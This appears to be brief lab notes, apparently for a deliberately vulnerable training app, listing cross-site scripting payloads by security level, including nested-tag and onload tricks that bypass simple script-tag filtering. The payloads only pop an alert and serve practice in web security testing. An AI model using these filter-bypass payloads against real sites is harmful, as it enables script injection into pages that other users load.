### Security level: LOW
* <script> alert(1) </script>

### Security level: MEDIUM:

* <s<script>cript>alert(1)</script>
* circumvented str_replace( '<script>', '')

### Security level: HIGH:

* <<meta>body onload=alert(1)>
* similar to stored XSS page
